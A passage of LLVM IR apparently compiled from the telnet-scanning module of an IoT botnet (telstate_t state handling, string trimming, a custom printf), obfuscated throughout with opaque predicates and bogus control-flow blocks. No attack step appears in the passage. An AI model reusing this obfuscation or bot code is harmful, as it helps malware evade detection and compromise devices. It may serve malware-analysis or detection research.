  store i32 0, i32* %4, align 4
  br label %95

; <label>:95:                                     ; preds = %94, %originalBBpart2
  %96 = load i32, i32* @x.17
  %97 = load i32, i32* @y.18
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %95
  %104 = load i32, i32* %4, align 4
  %105 = load i32, i32* @x.17
  %106 = load i32, i32* @y.18
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %104

originalBBalteredBB:                              ; preds = %originalBB, %13
  store i32 0, i32* %4, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %77
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %95
  %113 = load i32, i32* %4, align 4
  br label %originalBB6
}

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #5
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %3 = load i32, i32* @x.21
  %4 = load i32, i32* @y.22
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca %struct.telstate_t*, align 8
  %12 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %11, align 8
  store i32 %1, i32* %12, align 4
  %13 = load i32, i32* %12, align 4
  %14 = icmp eq i32 %13, 0
  %15 = load i32, i32* @x.21
  %16 = load i32, i32* @y.22
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %28

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %25 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i32 0, i32 0
  %26 = load i32, i32* %25, align 8
  %27 = call i32 @close(i32 %26)
  br label %28

; <label>:28:                                     ; preds = %23, %originalBBpart2
  %29 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %30 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %29, i32 0, i32 7
  store i32 0, i32* %30, align 8
  %31 = load i32, i32* %12, align 4
  %32 = trunc i32 %31 to i8
  %33 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %34 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i32 0, i32 2
  store i8 %32, i8* %34, align 8
  %35 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %36 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i32 0, i32 9
  %37 = load i8*, i8** %36, align 8
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 1024, i32 1, i1 false)
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %38 = alloca %struct.telstate_t*, align 8
  %39 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %38, align 8
  store i32 %1, i32* %39, align 4
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 0
  br label %originalBB
}

declare i32 @close(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_telstate(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = load i32, i32* @x.25
  %3 = load i32, i32* @y.26
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i8* %0, i8** %10, align 8
  store i32 0, i32* %12, align 4
  %14 = load i8*, i8** %10, align 8
  %15 = call i64 @strlen(i8* %14) #9
  %16 = sub i64 %15, 1
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %13, align 4
  %18 = load i32, i32* @x.25
  %19 = load i32, i32* @y.26
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart225, %originalBBpart2
  %27 = load i32, i32* @x.25
  %28 = load i32, i32* @y.26
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %26
  %35 = load i8*, i8** %10, align 8
  %36 = load i32, i32* %12, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = sext i8 %39 to i32
  %41 = call i32 @isspace(i32 %40) #9
  %42 = icmp ne i32 %41, 0
  %43 = load i32, i32* @x.25
  %44 = load i32, i32* @y.26
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  br i1 %42, label %51, label %70

; <label>:51:                                     ; preds = %originalBBpart213
  %52 = load i32, i32* @x.25
  %53 = load i32, i32* @y.26
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %51
  %60 = load i32, i32* %12, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %12, align 4
  %62 = load i32, i32* @x.25
  %63 = load i32, i32* @y.26
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart225, label %originalBB15alteredBB

originalBBpart225:                                ; preds = %originalBB15
  br label %26

; <label>:70:                                     ; preds = %originalBBpart213
  br label %71

; <label>:71:                                     ; preds = %86, %70
  %72 = load i32, i32* %13, align 4
  %73 = load i32, i32* %12, align 4
  %74 = icmp sge i32 %72, %73
  br i1 %74, label %75, label %84

; <label>:75:                                     ; preds = %71
  %76 = load i8*, i8** %10, align 8
  %77 = load i32, i32* %13, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = load i8, i8* %79, align 1
  %81 = sext i8 %80 to i32
  %82 = call i32 @isspace(i32 %81) #9
  %83 = icmp ne i32 %82, 0
  br label %84

; <label>:84:                                     ; preds = %75, %71
  %85 = phi i1 [ false, %71 ], [ %83, %75 ]
  br i1 %85, label %86, label %89

; <label>:86:                                     ; preds = %84
  %87 = load i32, i32* %13, align 4
  %88 = add nsw i32 %87, -1
  store i32 %88, i32* %13, align 4
  br label %71

; <label>:89:                                     ; preds = %84
  %90 = load i32, i32* %12, align 4
  store i32 %90, i32* %11, align 4
  br label %91

; <label>:91:                                     ; preds = %107, %89
  %92 = load i32, i32* %11, align 4
  %93 = load i32, i32* %13, align 4
  %94 = icmp sle i32 %92, %93
  br i1 %94, label %95, label %110

; <label>:95:                                     ; preds = %91
  %96 = load i8*, i8** %10, align 8
  %97 = load i32, i32* %11, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8, i8* %96, i64 %98
  %100 = load i8, i8* %99, align 1
  %101 = load i8*, i8** %10, align 8
  %102 = load i32, i32* %11, align 4
  %103 = load i32, i32* %12, align 4
  %104 = sub nsw i32 %102, %103
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %101, i64 %105
  store i8 %100, i8* %106, align 1
  br label %107

; <label>:107:                                    ; preds = %95
  %108 = load i32, i32* %11, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %11, align 4
  br label %91

; <label>:110:                                    ; preds = %91
  %111 = load i8*, i8** %10, align 8
  %112 = load i32, i32* %11, align 4
  %113 = load i32, i32* %12, align 4
  %114 = sub nsw i32 %112, %113
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8, i8* %111, i64 %115
  store i8 0, i8* %116, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %117 = alloca i8*, align 8
  %118 = alloca i32, align 4
  %119 = alloca i32, align 4
  %120 = alloca i32, align 4
  store i8* %0, i8** %117, align 8
  store i32 0, i32* %119, align 4
  %121 = load i8*, i8** %117, align 8
  %122 = call i64 @strlen(i8* %121) #9
  %_ = sub i64 %122, 1
  %gen = mul i64 %_, 1
  %_1 = sub i64 0, %122
  %gen2 = add i64 %_1, 1
  %_3 = shl i64 %122, 1
  %_4 = sub i64 0, %122
  %gen5 = add i64 %_4, 1
  %_6 = sub i64 0, %122
  %gen7 = add i64 %_6, 1
  %_8 = sub i64 %122, 1
  %gen9 = mul i64 %_8, 1
  %_10 = shl i64 %122, 1
  %123 = sub i64 %122, 1
  %124 = trunc i64 %123 to i32
  store i32 %124, i32* %120, align 4
  br label %originalBB

originalBB11alteredBB:                            ; preds = %originalBB11, %26
  %125 = load i8*, i8** %10, align 8
  %126 = load i32, i32* %12, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8, i8* %125, i64 %127
  %129 = load i8, i8* %128, align 1
  %130 = sext i8 %129 to i32
  %131 = call i32 @isspace(i32 %130) #9
  %132 = icmp ne i32 %131, 0
  br label %originalBB11

originalBB15alteredBB:                            ; preds = %originalBB15, %51
  %133 = load i32, i32* %12, align 4
  %_16 = sub i32 %133, 1
  %gen17 = mul i32 %_16, 1
  %_18 = sub i32 0, %133
  %gen19 = add i32 %_18, 1
  %_20 = sub i32 %133, 1
  %gen21 = mul i32 %_20, 1
  %_22 = shl i32 %133, 1
  %_23 = shl i32 %133, 1
  %134 = add nsw i32 %133, 1
  store i32 %134, i32* %12, align 4
  br label %originalBB15
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %originalBBpart288, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %542

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %482

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %46

; <label>:29:                                     ; preds = %22
  %30 = load i32, i32* @x.29
  %31 = load i32, i32* @y.30
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %29
  %38 = load i32, i32* @x.29
  %39 = load i32, i32* @y.30
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %542

; <label>:46:                                     ; preds = %22
  %47 = load i8*, i8** %5, align 8
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 37
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %46
  br label %499

; <label>:52:                                     ; preds = %46
  %53 = load i8*, i8** %5, align 8
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp eq i32 %55, 45
  br i1 %56, label %57, label %76

; <label>:57:                                     ; preds = %52
  %58 = load i32, i32* @x.29
  %59 = load i32, i32* @y.30
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %57
  %66 = load i8*, i8** %5, align 8
  %67 = getelementptr inbounds i8, i8* %66, i32 1
  store i8* %67, i8** %5, align 8
  store i32 1, i32* %8, align 4
  %68 = load i32, i32* @x.29
  %69 = load i32, i32* @y.30
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %76

; <label>:76:                                     ; preds = %originalBBpart24, %52
  %77 = load i32, i32* @x.29
  %78 = load i32, i32* @y.30
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %76
  %85 = load i32, i32* @x.29
  %86 = load i32, i32* @y.30
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %93

; <label>:93:                                     ; preds = %114, %originalBBpart28
  %94 = load i32, i32* @x.29
  %95 = load i32, i32* @y.30
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %93
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 48
  %106 = load i32, i32* @x.29
  %107 = load i32, i32* @y.30
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %105, label %114, label %119

; <label>:114:                                    ; preds = %originalBBpart212
  %115 = load i8*, i8** %5, align 8
  %116 = getelementptr inbounds i8, i8* %115, i32 1
  store i8* %116, i8** %5, align 8
  %117 = load i32, i32* %8, align 4
  %118 = or i32 %117, 2
  store i32 %118, i32* %8, align 4
  br label %93

; <label>:119:                                    ; preds = %originalBBpart212
  br label %120

; <label>:120:                                    ; preds = %141, %119
  %121 = load i8*, i8** %5, align 8
  %122 = load i8, i8* %121, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp sge i32 %123, 48
  br i1 %124, label %125, label %130

; <label>:125:                                    ; preds = %120
  %126 = load i8*, i8** %5, align 8
  %127 = load i8, i8* %126, align 1
  %128 = zext i8 %127 to i32
  %129 = icmp sle i32 %128, 57
  br label %130

; <label>:130:                                    ; preds = %125, %120
  %131 = phi i1 [ false, %120 ], [ %129, %125 ]
  br i1 %131, label %132, label %144

; <label>:132:                                    ; preds = %130
  %133 = load i32, i32* %7, align 4
  %134 = mul nsw i32 %133, 10
  store i32 %134, i32* %7, align 4
  %135 = load i8*, i8** %5, align 8
  %136 = load i8, i8* %135, align 1
  %137 = zext i8 %136 to i32
  %138 = sub nsw i32 %137, 48
  %139 = load i32, i32* %7, align 4
  %140 = add nsw i32 %139, %138
  store i32 %140, i32* %7, align 4
  br label %141

; <label>:141:                                    ; preds = %132
  %142 = load i8*, i8** %5, align 8
  %143 = getelementptr inbounds i8, i8* %142, i32 1
  store i8* %143, i8** %5, align 8
  br label %120

; <label>:144:                                    ; preds = %130
  %145 = load i8*, i8** %5, align 8
  %146 = load i8, i8* %145, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 115
  br i1 %148, label %149, label %215

; <label>:149:                                    ; preds = %144
  %150 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %151 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %150, i32 0, i32 0
  %152 = load i32, i32* %151, align 8
  %153 = icmp ule i32 %152, 40
  br i1 %153, label %154, label %176

; <label>:154:                                    ; preds = %149
  %155 = load i32, i32* @x.29
  %156 = load i32, i32* @y.30
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %154
  %163 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %150, i32 0, i32 3
  %164 = load i8*, i8** %163, align 8
  %165 = getelementptr i8, i8* %164, i32 %152
  %166 = bitcast i8* %165 to i32*
  %167 = add i32 %152, 8
  store i32 %167, i32* %151, align 8
  %168 = load i32, i32* @x.29
  %169 = load i32, i32* @y.30
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBBpart218, label %originalBB14alteredBB

originalBBpart218:                                ; preds = %originalBB14
  br label %197

; <label>:176:                                    ; preds = %149
  %177 = load i32, i32* @x.29
  %178 = load i32, i32* @y.30
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %176
  %185 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %150, i32 0, i32 2
  %186 = load i8*, i8** %185, align 8
  %187 = bitcast i8* %186 to i32*
  %188 = getelementptr i8, i8* %186, i32 8
  store i8* %188, i8** %185, align 8
  %189 = load i32, i32* @x.29
  %190 = load i32, i32* @y.30
  %191 = sub i32 %189, 1
  %192 = mul i32 %189, %191
  %193 = urem i32 %192, 2
  %194 = icmp eq i32 %193, 0
  %195 = icmp slt i32 %190, 10
  %196 = or i1 %194, %195
  br i1 %196, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br label %197

; <label>:197:                                    ; preds = %originalBBpart222, %originalBBpart218
  %198 = phi i32* [ %166, %originalBBpart218 ], [ %187, %originalBBpart222 ]
  %199 = load i32, i32* %198, align 4
  %200 = sext i32 %199 to i64
  %201 = inttoptr i64 %200 to i8*
  store i8* %201, i8** %11, align 8
  %202 = load i8**, i8*** %4, align 8
  %203 = load i8*, i8** %11, align 8
  %204 = icmp ne i8* %203, null
  br i1 %204, label %205, label %207

; <label>:205:                                    ; preds = %197
  %206 = load i8*, i8** %11, align 8
  br label %208

; <label>:207:                                    ; preds = %197
  br label %208

; <label>:208:                                    ; preds = %207, %205
  %209 = phi i8* [ %206, %205 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.575, i32 0, i32 0), %207 ]
  %210 = load i32, i32* %7, align 4
  %211 = load i32, i32* %8, align 4
  %212 = call i32 @prints(i8** %202, i8* %209, i32 %210, i32 %211)
  %213 = load i32, i32* %9, align 4
  %214 = add nsw i32 %213, %212
  store i32 %214, i32* %9, align 4
  br label %523

; <label>:215:                                    ; preds = %144
  %216 = load i32, i32* @x.29
  %217 = load i32, i32* @y.30
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %215
  %224 = load i8*, i8** %5, align 8
  %225 = load i8, i8* %224, align 1
  %226 = zext i8 %225 to i32
  %227 = icmp eq i32 %226, 100
  %228 = load i32, i32* @x.29
  %229 = load i32, i32* @y.30
  %230 = sub i32 %228, 1
  %231 = mul i32 %228, %230
  %232 = urem i32 %231, 2
  %233 = icmp eq i32 %232, 0
  %234 = icmp slt i32 %229, 10
  %235 = or i1 %233, %234
  br i1 %235, label %originalBBpart227, label %originalBB24alteredBB

originalBBpart227:                                ; preds = %originalBB24
  br i1 %227, label %236, label %293

; <label>:236:                                    ; preds = %originalBBpart227
  %237 = load i32, i32* @x.29
  %238 = load i32, i32* @y.30
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %236
  %245 = load i8**, i8*** %4, align 8
  %246 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %247 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %246, i32 0, i32 0
  %248 = load i32, i32* %247, align 8
  %249 = icmp ule i32 %248, 40
  %250 = load i32, i32* @x.29
  %251 = load i32, i32* @y.30
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %249, label %258, label %280

; <label>:258:                                    ; preds = %originalBBpart231
  %259 = load i32, i32* @x.29
  %260 = load i32, i32* @y.30
  %261 = sub i32 %259, 1
  %262 = mul i32 %259, %261
  %263 = urem i32 %262, 2
  %264 = icmp eq i32 %263, 0
  %265 = icmp slt i32 %260, 10
  %266 = or i1 %264, %265
  br i1 %266, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %258
  %267 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %246, i32 0, i32 3
  %268 = load i8*, i8** %267, align 8
  %269 = getelementptr i8, i8* %268, i32 %248
  %270 = bitcast i8* %269 to i32*
  %271 = add i32 %248, 8
  store i32 %271, i32* %247, align 8
  %272 = load i32, i32* @x.29
  %273 = load i32, i32* @y.30
  %274 = sub i32 %272, 1
  %275 = mul i32 %272, %274
  %276 = urem i32 %275, 2
  %277 = icmp eq i32 %276, 0
  %278 = icmp slt i32 %273, 10
  %279 = or i1 %277, %278
  br i1 %279, label %originalBBpart243, label %originalBB33alteredBB

originalBBpart243:                                ; preds = %originalBB33
  br label %285

; <label>:280:                                    ; preds = %originalBBpart231
  %281 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %246, i32 0, i32 2
  %282 = load i8*, i8** %281, align 8
  %283 = bitcast i8* %282 to i32*
  %284 = getelementptr i8, i8* %282, i32 8
  store i8* %284, i8** %281, align 8
  br label %285

; <label>:285:                                    ; preds = %280, %originalBBpart243
  %286 = phi i32* [ %270, %originalBBpart243 ], [ %283, %280 ]
  %287 = load i32, i32* %286, align 4
  %288 = load i32, i32* %7, align 4
  %289 = load i32, i32* %8, align 4
  %290 = call i32 @printi(i8** %245, i32 %287, i32 10, i32 1, i32 %288, i32 %289, i32 97)
  %291 = load i32, i32* %9, align 4
  %292 = add nsw i32 %291, %290
  store i32 %292, i32* %9, align 4
  br label %523

; <label>:293:                                    ; preds = %originalBBpart227
  %294 = load i8*, i8** %5, align 8
  %295 = load i8, i8* %294, align 1
  %296 = zext i8 %295 to i32
  %297 = icmp eq i32 %296, 120
  br i1 %297, label %298, label %371

; <label>:298:                                    ; preds = %293
  %299 = load i8**, i8*** %4, align 8
  %300 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %301 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %300, i32 0, i32 0
  %302 = load i32, i32* %301, align 8
  %303 = icmp ule i32 %302, 40
  br i1 %303, label %304, label %326

; <label>:304:                                    ; preds = %298
  %305 = load i32, i32* @x.29
  %306 = load i32, i32* @y.30
  %307 = sub i32 %305, 1
  %308 = mul i32 %305, %307
  %309 = urem i32 %308, 2
  %310 = icmp eq i32 %309, 0
  %311 = icmp slt i32 %306, 10
  %312 = or i1 %310, %311
  br i1 %312, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %304
  %313 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %300, i32 0, i32 3
  %314 = load i8*, i8** %313, align 8
  %315 = getelementptr i8, i8* %314, i32 %302
  %316 = bitcast i8* %315 to i32*
  %317 = add i32 %302, 8
  store i32 %317, i32* %301, align 8
  %318 = load i32, i32* @x.29
  %319 = load i32, i32* @y.30
  %320 = sub i32 %318, 1
  %321 = mul i32 %318, %320
  %322 = urem i32 %321, 2
  %323 = icmp eq i32 %322, 0
  %324 = icmp slt i32 %319, 10
  %325 = or i1 %323, %324
  br i1 %325, label %originalBBpart249, label %originalBB45alteredBB

originalBBpart249:                                ; preds = %originalBB45
